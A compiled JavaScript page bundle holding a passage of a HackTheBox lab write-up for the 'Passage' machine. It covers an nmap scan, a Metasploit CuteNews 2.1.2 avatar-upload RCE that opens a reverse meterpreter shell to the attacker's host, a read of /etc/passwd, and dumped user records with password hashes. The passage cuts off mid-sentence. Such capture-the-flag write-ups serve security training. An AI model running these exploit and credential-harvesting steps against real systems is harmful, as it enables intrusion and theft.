"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[771],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var a=n(67294);function s(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){s(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function r(e,t){if(null==e)return{};var n,a,s=function(e,t){if(null==e)return{};var n,a,s={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(s[n]=e[n]);return s}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,s=e.mdxType,i=e.originalType,l=e.parentName,c=r(e,["components","mdxType","originalType","parentName"]),u=p(n),m=s,h=u["".concat(l,".").concat(m)]||u[m]||d[m]||i;return n?a.createElement(h,o(o({ref:t},c),{},{components:n})):a.createElement(h,o({ref:t},c))}));function h(e,t){var n=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var i=n.length,o=new Array(i);o[0]=m;var r={};for(var l in t)hasOwnProperty.call(t,l)&&(r[l]=t[l]);r.originalType=e,r[u]="string"==typeof e?e:s,o[1]=r;for(var p=2;p<i;p++)o[p]=n[p];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},62825:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>i,metadata:()=>r,toc:()=>p});var a=n(87462),s=(n(67294),n(3905));const i={layout:"post",title:"Passage ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","php","web","rce"],date:"2021/03/08 19:36:00",thumbnail:"/img/HackTheBox/passage.png",toc:!0},o="Information",r={unversionedId:"HackTheBox/Passage/write-up",id:"HackTheBox/Passage/write-up",title:"Passage ",description:"- Name: Passage",source:"@site/writeups/HackTheBox/Passage/write-up.md",sourceDirName:"HackTheBox/Passage",slug:"/HackTheBox/Passage/write-up",permalink:"/writeups/HackTheBox/Passage/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"php",permalink:"/writeups/tags/php"},{label:"web",permalink:"/writeups/tags/web"},{label:"rce",permalink:"/writeups/tags/rce"}],version:"current",frontMatter:{layout:"post",title:"Passage ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","php","web","rce"],date:"2021/03/08 19:36:00",thumbnail:"/img/HackTheBox/passage.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"OpenAdmin ",permalink:"/writeups/HackTheBox/OpenAdmin/write-up"},next:{title:"Ready ",permalink:"/writeups/HackTheBox/Ready/write-up"}},l={},p=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"HTTP exploration",id:"http-exploration",level:2},{value:"HTTP exploitation",id:"http-exploitation",level:2},{value:"System enumeration",id:"system-enumeration",level:2},{value:"Privilege Escalation of Machine : from www-data to paul",id:"privilege-escalation-of-machine--from-www-data-to-paul",level:2},{value:"Waypoint",id:"waypoint",level:2},{value:"Privilege Escalation of Machine : paul to nadav",id:"privilege-escalation-of-machine--paul-to-nadav",level:2},{value:"Privilege Escalation of Machine : nadav to root",id:"privilege-escalation-of-machine--nadav-to-root",level:2},{value:"Bonus",id:"bonus",level:2}],c={toc:p},u="wrapper";function d(e){let{components:t,...i}=e;return(0,s.kt)(u,(0,a.Z)({},c,i,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"information"},"Information"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"Name:")," Passage"),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"Profile:")," ",(0,s.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/275"},"www.hackthebox.eu")),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,s.kt)("li",{parentName:"ul"},(0,s.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,s.kt)("p",null,(0,s.kt)("img",{alt:"Passage",src:n(21664).Z,width:"598",height:"381"})),(0,s.kt)("h2",{id:"overview"},"Overview"),(0,s.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap exploit-db metasploit ruby-ctf-party haiti john peass\n")),(0,s.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,s.kt)("p",null,"Port and service scan with nmap:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Mon Sep  7 14:40:30 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.129.8.231\nNmap scan report for 10.129.8.231\nHost is up (0.027s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)\n|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)\n|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Passage News\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Mon Sep  7 14:40:57 2020 -- 1 IP address (1 host up) scanned in 26.35 seconds\n")),(0,s.kt)("h2",{id:"http-exploration"},"HTTP exploration"),(0,s.kt)("p",null,"At the bottom of the main page we can read:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"Powered by CuteNews\n")),(0,s.kt)("p",null,"With exploitdb we can search exploits for ",(0,s.kt)("inlineCode",{parentName:"p"},"CuteNews"),"."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ searchsploit CuteNews\n")),(0,s.kt)("p",null,"One of the RSS post (",(0,s.kt)("a",{parentName:"p",href:"http://10.129.8.231/index.php?do=rss&id=11"},"http://10.129.8.231/index.php?do=rss&id=11"),") is telling us\nthere is a Fail2Ban, so bruteforcing is useless."),(0,s.kt)("blockquote",null,(0,s.kt)("p",{parentName:"blockquote"},"Due to unusually large amounts of traffic, we have implemented Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection.")),(0,s.kt)("p",null,"By checking the source code repository (",(0,s.kt)("a",{parentName:"p",href:"https://github.com/CuteNews/cutenews-2.0"},"https://github.com/CuteNews/cutenews-2.0"),")\nwe can find some files or paths existing on the webserver without bruteforcing."),(0,s.kt)("p",null,"By consulting ",(0,s.kt)("a",{parentName:"p",href:"http://10.129.8.231/news.php"},"http://10.129.8.231/news.php")," we are redirected to ",(0,s.kt)("a",{parentName:"p",href:"http://passage.htb/CuteNews/rss.php"},"http://passage.htb/CuteNews/rss.php"),",\nso a domain is used for a virtual host. Let's add it to our hosts file:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ cat /etc/hosts | grep pass\n10.129.8.231 passage.htb\n")),(0,s.kt)("h2",{id:"http-exploitation"},"HTTP exploitation"),(0,s.kt)("p",null,"In ",(0,s.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/46698"},"EDB 46698"),", we see the login page\nis ",(0,s.kt)("a",{parentName:"p",href:"http://passage.htb/CuteNews/index.php?mod=main&opt=personal"},"http://passage.htb/CuteNews/index.php?mod=main&opt=personal")),(0,s.kt)("p",null,"This page leaks the exact version: ",(0,s.kt)("inlineCode",{parentName:"p"},"CuteNews 2.1.2"),"."),(0,s.kt)("p",null,"Let's register an account for the authenticated exploit: ",(0,s.kt)("a",{parentName:"p",href:"http://passage.htb/CuteNews/index.php?register"},"http://passage.htb/CuteNews/index.php?register")),(0,s.kt)("p",null,"Then we can add the EDB exploit in msf:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ cp /usr/share/exploitdb/exploits/php/remote/46698.rb .\n$ nvim 46698.rb # Fix the comma\n$ sudo cp 46698.rb /opt/metasploit/modules/exploits/unix/webapp/cutenews_avatar_rce.rb\n$ sudo updatedb\n")),(0,s.kt)("p",null,"So now we are finally able to use the exploit & gain a shell access:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ msfconsole\nmsf5 > use exploit/unix/webapp/cutenews_avatar_rce\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\nmsf5 exploit(unix/webapp/cutenews_avatar_rce) > set PASSWORD cyfun\nPASSWORD => cyfun\nmsf5 exploit(unix/webapp/cutenews_avatar_rce) > set USERNAME cyfun\nUSERNAME => cyfun\nmsf5 exploit(unix/webapp/cutenews_avatar_rce) > set rHOSTS 10.129.8.231\nrHOSTS => 10.129.8.231\nmsf5 exploit(unix/webapp/cutenews_avatar_rce) > set LHOST 10.10.14.157\nLHOST => 10.10.14.157\nmsf5 exploit(unix/webapp/cutenews_avatar_rce) > run\n\n[*] Started reverse TCP handler on 10.10.14.157:4444\n[*] http://10.129.8.231:80 - CuteNews is 2.1.2\n[+] Authentication was successful with user: cyfun\n[*] Trying to upload lgepbxvv.php\n[+] Upload successfully.\n[*] Sending stage (38288 bytes) to 10.129.8.231\n[*] Meterpreter session 1 opened (10.10.14.157:4444 -> 10.129.8.231:57094) at 2020-09-07 15:50:18 +0200\nmeterpreter >\n")),(0,s.kt)("h2",{id:"system-enumeration"},"System enumeration"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n$ cat /etc/os-release\nNAME="Ubuntu"\nVERSION="16.04.6 LTS (Xenial Xerus)"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 16.04.6 LTS"\nVERSION_ID="16.04"\nHOME_URL="http://www.ubuntu.com/"\nSUPPORT_URL="http://help.ubuntu.com/"\nBUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"\nVERSION_CODENAME=xenial\nUBUNTU_CODENAME=xenial\n\n$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nmessagebus:x:106:110::/var/run/dbus:/bin/false\nuuidd:x:107:111::/run/uuidd:/bin/false\nlightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false\nwhoopsie:x:109:117::/nonexistent:/bin/false\navahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false\navahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false\ndnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false\ncolord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false\nspeech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false\nhplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false\nkernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false\npulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false\nrtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false\nsaned:x:119:127::/var/lib/saned:/bin/false\nusbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false\nnadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash\npaul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash\nsshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin\n')),(0,s.kt)("h2",{id:"privilege-escalation-of-machine--from-www-data-to-paul"},"Privilege Escalation of Machine : from www-data to paul"),(0,s.kt)("p",null,"The folder ",(0,s.kt)("inlineCode",{parentName:"p"},"/var/www/html/CuteNews/cdata/users")," contains users information\nin various files, eg. ",(0,s.kt)("inlineCode",{parentName:"p"},"09.php")," etc. and the data is base64 encoded.\nSo it's not easy to find info about a particular user at a glance."),(0,s.kt)("p",null,"With ",(0,s.kt)("inlineCode",{parentName:"p"},"cat ??.php")," I displayed info about all users and then stripped the\nphp directive to keep only the base64 data."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319\nYToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=\nYToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319\nYToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxMDoiMTU5OTQ4NDMzMiI7czozOiJjbnQiO3M6MToiMiI7fX19\nYToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODkxMDg5NjtzOjY6ImhhY2tlciI7fX0=\nYToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6Im5vcmFqQGh0Yi5sb2NhbCI7czo1OiJub3JhaiI7fX0=\nYToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=\nYToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJub3JhaiI7YToxMTp7czoyOiJpZCI7czoxMDoiMTU5OTQ4NDM5NSI7czo0OiJuYW1lIjtzOjU6Im5vcmFqIjtzOjM6ImFjbCI7czoxOiI0IjtzOjU6ImVtYWlsIjtzOjE1OiJub3JhakBodGIubG9jYWwiO3M6NDoibmljayI7czo1OiJub3JhaiI7czo0OiJwYXNzIjtzOjY0OiI0ZDlmNzU2ZDM2ZjgyODk2ZDk2YzVlOTEzMTA1MTExN2E2ZThjNWZkODlhMTY5ZjA0NDBjNDZhODUzZTJjNDRiIjtzOjM6Imx0cyI7czoxMDoiMTU5OTQ4OTQwOSI7czozOiJiYW4iO3M6MToiMCI7czo0OiJtb3JlIjtzOjYwOiJZVG95T250ek9qUTZJbk5wZEdVaU8zTTZNRG9pSWp0ek9qVTZJbUZpYjNWMElqdHpPakE2SWlJN2ZRPT0iO3M6NjoiYXZhdGFyIjtzOjI1OiJhdmF0YXJfbm9yYWpfeGN0eHVkanMucGhwIjtzOjY6ImUtaGlkZSI7czowOiIiO319fQ==\nYToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==\nYToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319\nYToxOntzOjU6ImVtYWlsIjthOjE6e3M6MjA6ImhhY2tlckBoYWNrZXIuaGFja2VyIjtzOjY6ImhhY2tlciI7fX0=\nYToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==\nYToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=\nYToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==\nYToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319\nYToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19\nYToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=\nYToxOntzOjQ6Im5hbWUiO2E6Mjp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg5MDY4ODEiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3lreG5hY3B0LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9czo2OiJoYWNrZXIiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg5MTA4OTYiO3M6NDoibmFtZSI7czo2OiJoYWNrZXIiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjA6ImhhY2tlckBoYWNrZXIuaGFja2VyIjtzOjQ6Im5pY2siO3M6NjoiaGFja2VyIjtzOjQ6InBhc3MiO3M6NjQ6ImU3ZDM2ODU3MTU5Mzk4NDI3NDljYzI3YjM4ZDBjY2I5NzA2ZDRkMTRhNTMwNGVmOWVlZTA5Mzc4MGVhYjVkZjkiO3M6MzoibHRzIjtzOjEwOiIxNTk4OTEwOTExIjtzOjM6ImJhbiI7czoxOiIwIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czo2OiJhdmF0YXIiO3M6MjY6ImF2YXRhcl9oYWNrZXJfanB5b3lza3QucGhwIjtzOjY6ImUtaGlkZSI7czowOiIiO319fQ==\nYToxOntzOjI6ImlkIjthOjE6e2k6MTU5OTQ4NDM5NTtzOjU6Im5vcmFqIjt9fQ==\nYToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0\n")),(0,s.kt)("p",null,"Then I wrote a short ruby script (using ",(0,s.kt)("a",{parentName:"p",href:"https://github.com/cyfun/ctf-party"},"ctf-party")," lib) to base64 decode each line."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-ruby"},"require 'ctf_party'\nFile.readlines('usersb64.txt').each do |line|\n    puts line.chomp.from_b64\nend\n")),(0,s.kt)("p",null,"I obtained the following result by running ",(0,s.kt)("inlineCode",{parentName:"p"},"ruby usersb64.rb"),":"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-php"},'a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}\na:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}\na:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}\na:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:10:"1599484332";s:3:"cnt";s:1:"2";}}}\na:1:{s:2:"id";a:1:{i:1598910896;s:6:"hacker";}}\na:1:{s:5:"email";a:1:{s:15:"cyfun@htb.local";s:5:"cyfun";}}\na:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}\na:1:{s:4:"name";a:1:{s:5:"cyfun";a:11:{s:2:"id";s:10:"1599484395";s:4:"name";s:5:"cyfun";s:3:"acl";s:1:"4";s:5:"email";s:15:"cyfun@htb.local";s:4:"nick";s:5:"cyfun";s:4:"pass";s:64:"4d9f756d36f82896d96c5e9131051117a6e8c5fd89a169f0440c46a853e2c44b";s:3:"lts";s:10:"1599489409";s:3:"ban";s:1:"0";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:25:"avatar_cyfun_xctxudjs.php";s:6:"e-hide";s:0:"";}}}\na:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}\na:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}\na:1:{s:5:"email";a:1:{s:20:"hacker@hacker.hacker";s:6:"hacker";}}\na:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}\na:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}\na:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}\na:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}\na:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}\na:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}\na:1:{s:4:"name";a:2:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598906881";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_ykxnacpt.php";s:6:"e-hide";s:0:"";}s:6:"hacker";a:11:{s:2:"id";s:10:"1598910896";s:4:"name";s:6:"hacker";s:3:"acl";s:1:"4";s:5:"email";s:20:"hacker@hacker.hacker";s:4:"nick";s:6:"hacker";s:4:"pass";s:64:"e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9";s:3:"lts";s:10:"1598910911";s:3:"ban";s:1:"0";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:6:"avatar";s:26:"avatar_hacker_jpyoyskt.php";s:6:"e-hide";s:0:"";}}}\na:1:{s:2:"id";a:1:{i:1599484395;s:5:"cyfun";}}\n')),(0,s.kt)("p",null,"I retrieved all the hashes to try to get them 